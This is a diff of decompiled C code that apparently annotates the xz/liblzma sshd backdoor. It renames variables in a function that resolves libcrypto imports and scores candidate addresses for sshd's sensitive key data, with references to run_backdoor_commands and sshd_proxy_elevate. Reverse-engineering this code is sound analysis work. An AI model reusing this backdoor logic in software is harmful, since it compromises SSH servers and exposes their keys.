@@ -25,38 +25,32 @@ BOOL sshd_find_sensitive_data
   Elf64_Addr EVar1;
   Elf64_Ehdr *pEVar2;
   u64 uVar3;
-  u8 *code_start_00;
-  u8 *puVar4;
-  BOOL BVar5;
-  BOOL BVar6;
-  uint uVar7;
-  uint uVar8;
-  lzma_allocator *allocator_00;
-  pfn_EVP_DigestVerifyInit_t ppVar9;
-  void *pvVar10;
-  Elf64_Sym *pEVar11;
-  Elf64_Sym *pEVar12;
-  u8 *data_start_00;
-  pfn_EVP_CIPHER_CTX_new_t ppVar13;
-  pfn_EVP_chacha20_t ppVar14;
-  long lVar15;
-  secret_data_item_t *psVar16;
-  sensitive_data *psVar17;
-  byte bVar18;
-  secret_data_item_t secret_probe_items;
-  lzma_allocator *allocator;
+  u64 uVar4;
   u8 *code_start;
-  u8 *code_end;
+  u8 *puVar5;
+  BOOL BVar6;
+  BOOL BVar7;
+  uint uVar8;
+  uint uVar9;
+  lzma_allocator *allocator;
+  pfn_EVP_DigestVerifyInit_t ppVar10;
+  void *pvVar11;
+  Elf64_Sym *pEVar12;
+  Elf64_Sym *pEVar13;
   u8 *data_start;
-  sensitive_data *xzcalloc_candidate;
-  sensitive_data *krb_candidate;
-  sensitive_data *winning_candidate;
+  pfn_EVP_CIPHER_CTX_new_t ppVar14;
+  pfn_EVP_chacha20_t ppVar15;
+  long lVar16;
+  secret_data_item_t *psVar17;
+  sensitive_data *psVar18;
+  byte bVar19;
+  u64 code_segment_size;
   u64 data_segment_size;
   u8 *sshd_main_addr;
   u8 *code_scan_limit;
-  sensitive_data *xzcalloc_candidate_local;
   sensitive_data *krb_candidate_local;
-  secret_data_item_t local_88;
+  sensitive_data *xzcalloc_candidate_local;
+  secret_data_item_t secret_probe_items;
   code *local_70;
   undefined8 local_68;
   undefined8 local_60;
@@ -67,18 +61,18 @@ BOOL sshd_find_sensitive_data
   undefined8 local_38;
   undefined8 local_30;
   
-  bVar18 = 0;
-  BVar5 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x1c8,0,0x1d);
-  if (BVar5 == FALSE) {
+  bVar19 = 0;
+  BVar6 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x1c8,0,0x1d);
+  if (BVar6 == FALSE) {
     return FALSE;
   }
   local_68 = 0x1b000001c8;
-  local_88.code = (u8 *)sshd_proxy_elevate;
-  local_88.shift_cursor = (secret_data_shift_cursor_t)0x1c8;
-  local_88.operation_index = 0x1c;
+  secret_probe_items.code = (u8 *)sshd_proxy_elevate;
+  secret_probe_items.shift_cursor = (secret_data_shift_cursor_t)0x1c8;
+  secret_probe_items.operation_index = 0x1c;
   local_70 = run_backdoor_commands;
-  local_88.shift_count = 0;
-  local_88.index = 1;
+  secret_probe_items.shift_count = 0;
+  secret_probe_items.index = 1;
   local_60 = 0x100000000;
   local_58 = sshd_get_usable_socket;
   local_50 = 0x1a000001c3;
@@ -86,115 +80,113 @@ BOOL sshd_find_sensitive_data
   local_40 = sshd_get_client_socket;
   local_38 = 0x19000001bd;
   local_30 = 0x100000006;
-  BVar5 = secret_data_append_items(&local_88,4,secret_data_append_item);
-  if (BVar5 == FALSE) {
+  BVar6 = secret_data_append_items(&secret_probe_items,4,secret_data_append_item);
+  if (BVar6 == FALSE) {
     return FALSE;
   }
-  psVar16 = &local_88;
-  for (lVar15 = 0x18; lVar15 != 0; lVar15 = lVar15 + -1) {
-    *(undefined4 *)&psVar16->code = 0;
-    psVar16 = (secret_data_item_t *)((long)psVar16 + (ulong)bVar18 * -8 + 4);
+  psVar17 = &secret_probe_items;
+  for (lVar16 = 0x18; lVar16 != 0; lVar16 = lVar16 + -1) {
+    *(undefined4 *)&psVar17->code = 0;
+    psVar17 = (secret_data_item_t *)((long)psVar17 + (ulong)bVar19 * -8 + 4);
   }
-  winning_candidate = (sensitive_data *)0x0;
+  code_segment_size = 0;
   data_segment_size = 0;
   sshd_main_addr = (u8 *)0x0;
   code_scan_limit = (u8 *)0x0;
-  xzcalloc_candidate_local = (sensitive_data *)0x0;
   krb_candidate_local = (sensitive_data *)0x0;
-  allocator_00 = get_lzma_allocator();
-  allocator_00->opaque = libcrypto;
-  ppVar9 = (pfn_EVP_DigestVerifyInit_t)lzma_alloc(0x118,allocator_00);
-  funcs->EVP_DigestVerifyInit = ppVar9;
-  if (ppVar9 != (pfn_EVP_DigestVerifyInit_t)0x0) {
+  xzcalloc_candidate_local = (sensitive_data *)0x0;
+  allocator = get_lzma_allocator();
+  allocator->opaque = libcrypto;
+  ppVar10 = (pfn_EVP_DigestVerifyInit_t)lzma_alloc(0x118,allocator);
+  funcs->EVP_DigestVerifyInit = ppVar10;
+  if (ppVar10 != (pfn_EVP_DigestVerifyInit_t)0x0) {
     funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
   }
-  pvVar10 = elf_get_code_segment(sshd,(u64 *)&winning_candidate);
-  psVar17 = winning_candidate;
-  if (pvVar10 == (void *)0x0) {
+  pvVar11 = elf_get_code_segment(sshd,&code_segment_size);
+  uVar3 = code_segment_size;
+  if (pvVar11 == (void *)0x0) {
     return FALSE;
   }
-  pEVar11 = elf_symbol_get(libcrypto,STR_EVP_DigestVerify,0);
-  pEVar12 = elf_symbol_get(libcrypto,STR_EVP_sm,0);
-  if (pEVar12 == (Elf64_Sym *)0x0) {
+  pEVar12 = elf_symbol_get(libcrypto,STR_EVP_DigestVerify,0);
+  pEVar13 = elf_symbol_get(libcrypto,STR_EVP_sm,0);
+  if (pEVar13 == (Elf64_Sym *)0x0) {
     return FALSE;
   }
-  data_start_00 = (u8 *)elf_get_data_segment(sshd,&data_segment_size,FALSE);
-  uVar3 = data_segment_size;
-  if (data_start_00 == (u8 *)0x0) {
+  data_start = (u8 *)elf_get_data_segment(sshd,&data_segment_size,FALSE);
+  uVar4 = data_segment_size;
+  if (data_start == (u8 *)0x0) {
     return FALSE;
   }
-  if (pEVar11 != (Elf64_Sym *)0x0) {
-    EVar1 = pEVar11->st_value;
+  if (pEVar12 != (Elf64_Sym *)0x0) {
+    EVar1 = pEVar12->st_value;
     pEVar2 = libcrypto->elfbase;
     funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
     funcs->EVP_DigestVerify = (pfn_EVP_DigestVerify_t)(pEVar2->e_ident + EVar1);
   }
-  ppVar13 = (pfn_EVP_CIPHER_CTX_new_t)lzma_alloc(0x838,allocator_00);
-  funcs->EVP_CIPHER_CTX_new = ppVar13;
-  if (ppVar13 != (pfn_EVP_CIPHER_CTX_new_t)0x0) {
+  ppVar14 = (pfn_EVP_CIPHER_CTX_new_t)lzma_alloc(0x838,allocator);
+  funcs->EVP_CIPHER_CTX_new = ppVar14;
+  if (ppVar14 != (pfn_EVP_CIPHER_CTX_new_t)0x0) {
     funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
   }
-  BVar5 = sshd_find_main(&sshd_main_addr,sshd,libcrypto,funcs);
-  code_start_00 = sshd_main_addr;
-  if (BVar5 == FALSE) {
+  BVar6 = sshd_find_main(&sshd_main_addr,sshd,libcrypto,funcs);
+  code_start = sshd_main_addr;
+  if (BVar6 == FALSE) {
     return FALSE;
   }
   ctx->sshd_main = sshd_main_addr;
-  BVar5 = is_endbr64_instruction(sshd_main_addr,sshd_main_addr + 4,0xe230);
-  ctx->uses_endbr64 = (uint)(BVar5 != FALSE);
-  puVar4 = (u8 *)((long)pvVar10 + (long)psVar17);
-  if ((BVar5 != FALSE) &&
-     (BVar5 = find_function(code_start_00,(void **)0x0,&code_scan_limit,code_start_00,
-                            (u8 *)((long)pvVar10 + (long)psVar17),FIND_NOP),
-     puVar4 = code_scan_limit, BVar5 == FALSE)) {
+  BVar6 = is_endbr64_instruction(sshd_main_addr,sshd_main_addr + 4,0xe230);
+  ctx->uses_endbr64 = (uint)(BVar6 != FALSE);
+  puVar5 = (u8 *)((long)pvVar11 + uVar3);
+  if ((BVar6 != FALSE) &&
+     (BVar6 = find_function(code_start,(void **)0x0,&code_scan_limit,code_start,
+                            (u8 *)((long)pvVar11 + uVar3),FIND_NOP), puVar5 = code_scan_limit,
+     BVar6 == FALSE)) {
     return FALSE;
   }
-  code_scan_limit = puVar4;
-  BVar5 = sshd_get_sensitive_data_address_via_xcalloc
-                    (data_start_00,data_start_00 + uVar3,code_start_00,code_scan_limit,refs,
-                     &krb_candidate_local);
-  BVar6 = sshd_get_sensitive_data_address_via_krb5ccname
-                    (data_start_00,data_start_00 + uVar3,code_start_00,code_scan_limit,
-                     &xzcalloc_candidate_local,sshd);
-  ppVar14 = (pfn_EVP_chacha20_t)lzma_alloc(0xc28,allocator_00);
-  psVar17 = krb_candidate_local;
-  funcs->EVP_chacha20 = ppVar14;
-  if (ppVar14 != (pfn_EVP_chacha20_t)0x0) {
+  code_scan_limit = puVar5;
+  BVar6 = sshd_get_sensitive_data_address_via_xcalloc
+                    (data_start,data_start + uVar4,code_start,code_scan_limit,refs,&xzcalloc_candidate_local);
+  BVar7 = sshd_get_sensitive_data_address_via_krb5ccname
+                    (data_start,data_start + uVar4,code_start,code_scan_limit,&krb_candidate_local,sshd);
+  ppVar15 = (pfn_EVP_chacha20_t)lzma_alloc(0xc28,allocator);
+  psVar18 = xzcalloc_candidate_local;
+  funcs->EVP_chacha20 = ppVar15;
+  if (ppVar15 != (pfn_EVP_chacha20_t)0x0) {
     funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
   }
-  if (BVar5 == FALSE) {
+  if (BVar6 == FALSE) {
 LAB_00105772:
-    if (BVar6 == FALSE) goto LAB_001057d3;
-    uVar7 = 0;
+    if (BVar7 == FALSE) goto LAB_001057d3;
+    uVar8 = 0;
 LAB_001057a6:
-    uVar8 = sshd_get_sensitive_data_score(xzcalloc_candidate_local,sshd,refs);
+    uVar9 = sshd_get_sensitive_data_score(krb_candidate_local,sshd,refs);
   }
   else {
-    if (BVar6 != FALSE) {
-      if (krb_candidate_local == xzcalloc_candidate_local) {
-        uVar7 = sshd_get_sensitive_data_score(krb_candidate_local,sshd,refs);
-        if (uVar7 < 8) {
+    if (BVar7 != FALSE) {
+      if (xzcalloc_candidate_local == krb_candidate_local) {
+        uVar8 = sshd_get_sensitive_data_score(xzcalloc_candidate_local,sshd,refs);
+        if (uVar8 < 8) {
           return FALSE;
         }
         goto LAB_0010575e;
       }
-      uVar7 = sshd_get_sensitive_data_score(krb_candidate_local,sshd,refs);
+      uVar8 = sshd_get_sensitive_data_score(xzcalloc_candidate_local,sshd,refs);
       goto LAB_001057a6;
     }
-    if (BVar5 == FALSE) goto LAB_00105772;
-    uVar7 = sshd_get_sensitive_data_score(krb_candidate_local,sshd,refs);
-    uVar8 = 0;
+    if (BVar6 == FALSE) goto LAB_00105772;
+    uVar8 = sshd_get_sensitive_data_score(xzcalloc_candidate_local,sshd,refs);
+    uVar9 = 0;
   }
-  if (((uVar8 <= uVar7) && (psVar17 = krb_candidate_local, 7 < uVar7)) ||
-     ((uVar7 <= uVar8 && (psVar17 = xzcalloc_candidate_local, 7 < uVar8)))) {
+  if (((uVar9 <= uVar8) && (psVar18 = xzcalloc_candidate_local, 7 < uVar8)) ||
+     ((uVar8 <= uVar9 && (psVar18 = krb_candidate_local, 7 < uVar9)))) {
 LAB_0010575e:
-    ctx->sshd_sensitive_data = psVar17;
+    ctx->sshd_sensitive_data = psVar18;
     return TRUE;
   }
 LAB_001057d3:
-  lzma_free(funcs->EVP_DigestVerifyInit,allocator_00);
-  lzma_free(funcs->EVP_CIPHER_CTX_new,allocator_00);
-  lzma_free(funcs->EVP_chacha20,allocator_00);
+  lzma_free(funcs->EVP_DigestVerifyInit,allocator);
+  lzma_free(funcs->EVP_CIPHER_CTX_new,allocator);
+  lzma_free(funcs->EVP_chacha20,allocator);
   return FALSE;
 }
 
